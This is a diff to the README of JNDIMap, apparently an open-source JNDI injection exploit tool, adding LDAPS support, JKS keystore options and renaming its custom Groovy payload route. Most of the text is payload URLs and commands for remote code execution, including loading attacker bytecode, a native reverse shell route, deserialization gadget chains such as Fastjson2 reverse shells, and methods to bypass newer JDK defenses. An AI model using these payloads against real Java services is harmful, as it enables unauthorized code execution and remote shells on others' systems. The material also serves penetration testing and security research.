@@ -1,6 +1,6 @@
 # JNDIMap
 
-JNDIMap is a JNDI injection exploit tool that supports RMI and LDAP protocols, including a variety of methods to bypass higher-version JDK
+JNDIMap is a JNDI injection exploit tool that supports RMI, LDAP and LDAPS protocols, including a variety of methods to bypass higher-version JDK
 
 Features
 
@@ -12,7 +12,7 @@ Features
 - Commons DBCP/Tomcat DBCP/Tomcat JDBC/Alibaba Druid/HikariCP JDBC RCE
 - NativeLibLoader (load native library)
 - MLet (detect classes in classpath)
-- LDAP deserialization
+- LDAP(s) deserialization
 - custom JNDI payload (based on Groovy Language)
 
 ## Build
@@ -28,7 +28,7 @@ mvn package -Dmaven.test.skip=true
 ## Usage
 
 ```bash
-Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-u <url>] [-f <file>] [-h]
+Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-s <ldapsPort>] [-p <httpPort>] [-j <jksPath>] [-k <jksPin>] [-u <url>] [-f <file>] [-useReferenceOnly] [-h]
 ````
 
 `-i`: IP address to listen on (i.e. the codebase, must be specified as an IP that can be reached by the target, e.g. `192.168.1.100`, note that `0.0.0.0` is not available)
@@ -37,7 +37,13 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 
 `-l`: LDAP server listening port, default is `1389`
 
+`-s`: LDAPS server listening port, default is `1636`
+
 `-p`: HTTP server listening port, default is `3456`
+
+`-j`: path to the JKS file, used to configure the LDAPS server
+
+`-k`: JKS password, no password if not specified
 
 `-u`: specify the JNDI route manually, e.g. `/Basic/Command/open -a Calculator` (The JNDI URL is not completely controllable in some cases)
 
@@ -53,9 +59,11 @@ Please note that all the Base64 passed in is **Base64 URL encoded**, i.e. replac
 
 Most parameters support automatic Base64 URL decoding, that is, you can directly pass in plain text (command/IP/port/URL) or Base64 URL encoded content (some routes only accept Base64 URL encoded parameters, which will be specially noted below)
 
-The following routes support both RMI and LDAP protocols except `/Deserialize/*` (LDAP deserialization)
+The following routes support RMI, LDAP and LDAPS protocols except `/Deserialize/*` (LDAP(s) deserialization)
 
-For the RMI protocol, simply replace `ldap://` with `rmi://` in the URL
+For the RMI protocol, simply replace `ldap://127.0.0.1:1389/` with `rmi://127.0.0.1:1099/` in the payload url
+
+For the LDAPS protocol, simply replace `ldap://127.0.0.1:1389/` with `ldaps://127.0.0.1:1636/` in the payload url
 
 ### Basic
 
@@ -77,6 +85,7 @@ ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 # load via URL parameters
 ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
 # load from the server running JNDIMap
+ldap://127.0.0.1:1389/Basic/FromFile/Evil.class # the path is relative to the current directory
 ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file>
 
 # native reverse shell (Windows supported)
@@ -320,7 +329,7 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 ### Deserialize
 
-Supports Java deserialization via LDAP protocol (RMI protocol is not supported)
+Supports Java deserialization via LDAP(s) protocol (RMI protocol is not supported)
 
 JNDIMap has built-in the following gadgets, and also supports custom data deserialization
 
@@ -335,6 +344,7 @@ JNDIMap has built-in the following gadgets, and also supports custom data deseri
 # load via URL parameters
 ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialized-data>
 # load from the server running JNDIMap
+ldap://127.0.0.1:1389/Deserialize/FromFile/payload.ser # the path is relative to the current directory
 ldap://127.0.0.1:1389/Deserialize/FromFile/<base64-url-encoded-path-to-serialized-data>
 
 # CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution and native reverse shell
@@ -378,9 +388,9 @@ ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
 ```
 
-### Custom
+### Script
 
-JNDIMap supports writing custom JNDI payloads with [Groovy](https://groovy-lang.org/) language
+JNDIMap supports writing custom JNDI payload scripts with [Groovy](https://groovy-lang.org/) language
 
 Groovy script (using H2 RCE as an example)
 
@@ -412,13 +422,13 @@ Achieve RCE via the following JNDI URL
 
 ```bash
 # supports passing parameters to Groovy scripts manually
-ldap://127.0.0.1:1389/Custom/<args>
+ldap://127.0.0.1:1389/Script/<args>
 ```
 
 In some cases, the JNDI URL is not completely controllable, so you can specify the `-u` parameter
 
 ```bash
-java -jar JNDIMap.jar -f /path/to/evil.groovy -u "/Custom/open -a Calculator"
+java -jar JNDIMap.jar -f /path/to/evil.groovy -u "/Script/open -a Calculator"
 ```
 
 Then trigger via any JNDI URL
@@ -429,7 +439,7 @@ ldap://127.0.0.1:1389/x
 
 ### useReferenceOnly
 
-For JNDI injection of the LDAP protocol, if you want to use ObjectFactory to bypass it, the existing methods are to set the javaSerializedData attribute returned by the LDAP protocol to the serialized data of the Reference object
+For JNDI injection of the LDAP(s) protocol, if you want to use ObjectFactory to bypass it, the existing methods are to set the javaSerializedData attribute returned by the LDAP protocol to the serialized data of the Reference object
 
 However, since JDK 21, the `com.sun.jndi.ldap.object.trustSerialData` parameter defaults to false, which means that deserialization cannot be triggered through the LDAP protocol, and the Reference object cannot be parsed through the above method
 
@@ -482,3 +492,5 @@ java -jar JNDIMap.jar -useReferenceOnly
 [https://www.yulegeyu.com/2022/11/12/Java 安全攻防之老版本 Fastjson 的一些不出网利用/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)
 
 [https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/](https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/)
+
+[https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html](https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html)
